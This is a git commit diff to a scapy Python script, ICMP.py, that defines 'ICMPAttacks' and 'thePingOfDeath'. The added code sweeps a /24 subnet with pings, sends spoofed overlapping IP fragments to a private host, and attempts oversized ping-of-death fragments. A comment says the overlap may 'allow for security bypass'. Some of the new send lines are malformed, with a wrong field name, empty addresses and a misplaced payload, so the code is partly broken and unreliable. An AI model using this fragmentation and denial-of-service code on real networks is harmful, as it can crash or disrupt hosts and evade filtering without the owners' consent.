6689aaac1878c8574ef7115e74ba17513a6b3ac3
mikkejos222 <159195998+mikkejos222@users.noreply.github.com>
2024-04-10 09:29:51 -0500

    Update ICMP.py

--- ICMP.py
+++ ICMP.py
@@ -1,14 +1,21 @@
 #! /usr/bin/python
-from scapy.layers.inet import ICMP, fragment
+from scapy.layers.inet import ICMP, fragment, IP
 from scapy.layers.l2 import Ether, ARP
 import scapy.all as scapy
 import time
-from scapy.sendrecv import sr
 
-#https://www.securitynik.com/2018/07/understanding-ip-fragmentation.html
+from scapy.packet import Raw
+from scapy.sendrecv import sr, send
+
+
 def ICMPAttacks():
     def thePingOfDeath():
         ans, unans = sr(IP(dst="192.168.1.0/24")/ICMP(), timeout=3)
-        scapy.layers.inet.ICMP(type = 8, code = 0, chksum = None, id = 0, seq = 0, ts_ori = 22485762, ts_rx = 22485762, ts_tx = 22485762, gw = '0.0.0.0', ptr = 0, reserved = 0, length = 0, addr_mask = '0.0.0.0', nexthopmtu = 0, unused = None);
+        max_data_size = 65535
+        #Overlapping packets may cause issues, or allow for security bypass, may also be good in another attack to boost its results
+        send(IP(src="1.1.1.1", dst="192.168.208.131", id=20, flags=0x1, frag=0) / "OverlappingPacketAAAAAAAAAAAAAAAAAAA", count=1)
+        send(IP(src="1.1.1.1", dst="192.168.208.131", id=20, flags=0x0, frag=1) / "FunTestAAAAAAA", count=1)
+        send(IP(src = "", dest = "" , id=25, flags=0x1, frag =0)) / Raw(load="A" * 65528)
+        send(IP(src="", dest="", id=25, flags=0x0, frag=8191)) / Raw(load="A" * max_data_size)
     if __name__ == '__main__':
         thePingOfDeath()
